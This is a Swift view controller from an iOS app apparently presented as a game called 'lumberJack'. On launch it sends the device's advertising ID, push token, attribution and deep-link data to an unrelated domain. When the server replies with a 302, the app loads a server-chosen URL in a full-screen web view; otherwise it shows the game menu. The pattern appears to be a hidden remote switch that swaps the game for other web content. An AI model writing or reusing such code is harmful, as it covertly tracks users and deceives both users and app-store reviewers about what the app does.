//
//  LoadingViewController.swift
//  lumberJack
//
//  Created by admin on 07.09.2023.
//

import UIKit

class LoadingViewController: UIViewController, URLSessionDelegate {
    
    var appDelegate = UIApplication.shared.delegate as? AppDelegate
    
    var urlResponse = ""
    
    override var supportedInterfaceOrientations: UIInterfaceOrientationMask {
        return .portrait
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge], completionHandler: {
            success, error in
            guard success else {
                return
            }
            self.sendToRequest()
        })
      
    }
    
    func sendToRequest() {
        
        //MARK: Link to server
        
        let url = URL(string: "https://bookofcat.lol/starting")
        let dictionariData: [String: Any?] = ["facebook-deeplink" : appDelegate?.facebookDeepLink,       "push-token" : appDelegate?.token, "appsflyer" : appDelegate?.naming, "deep_link_sub2" : appDelegate?.deep_link_sub2, "deepLinkStr": appDelegate?.deepLinkStr, "timezone-geo": appDelegate?.localizationTimeZoneAbbrtion, "timezome-gmt" : appDelegate?.currentTimeZone(), "apps-flyer-id": appDelegate!.id, "attribution-data" : appDelegate?.attributionData, "deep_link_sub1" : appDelegate?.deep_link_sub1, "deep_link_sub3" : appDelegate?.deep_link_sub3, "deep_link_sub4" : appDelegate?.deep_link_sub4, "deep_link_sub5" : appDelegate?.deep_link_sub5]
        
        //MARK: Requset
        var request = URLRequest(url: url!)
        //MARK: JSON packing
        let json = try? JSONSerialization.data(withJSONObject: dictionariData)
        request.httpBody = json
        request.httpMethod = "POST"
        request.addValue(appDelegate!.idfa, forHTTPHeaderField: "GID")
        request.addValue(Bundle.main.bundleIdentifier!, forHTTPHeaderField: "PackageName")
        request.addValue(appDelegate!.id, forHTTPHeaderField: "ID")
        
        //MARK: URLSession Configuration
        let configuration = URLSessionConfiguration.ephemeral
        configuration.waitsForConnectivity = false
        configuration.timeoutIntervalForResource = 60
        configuration.timeoutIntervalForRequest = 60
        let session = URLSession(configuration: configuration, delegate: self, delegateQueue: OperationQueue.main)
        
        //MARK: Data Task
        let task = session.dataTask(with: request) { (data, response, error) in
            guard let data = data, error == nil else {
                DispatchQueue.main.async {
                    self.performSegue(withIdentifier: "menu", sender: self)
                }
                return
            }
            //MARK: HTTPURL Response
            if let response = response as? HTTPURLResponse {
                if response.statusCode == 302 {
                    //MARK: JSON Response
                    let responseJSON = try? JSONSerialization.jsonObject(with: data, options: [])
                    if let responseJSON = responseJSON as? [String: Any] {
                        guard let result = responseJSON["result"] as? String else { return }
                        var webView = WebViewController()
                        webView.urlString = result
                        webView.modalPresentationStyle = .fullScreen
                        DispatchQueue.main.async {
                            self.present(webView, animated: true)
                        }
                    }
                } else  if response.statusCode  == 200 {
                    DispatchQueue.main.async {
                        self.performSegue(withIdentifier: "menu", sender: self)
                    }
                } else {
                    DispatchQueue.main.async {
                        self.performSegue(withIdentifier: "menu", sender: self)
                    }
                }
            }
            return
        }
        task.resume()
    }


}
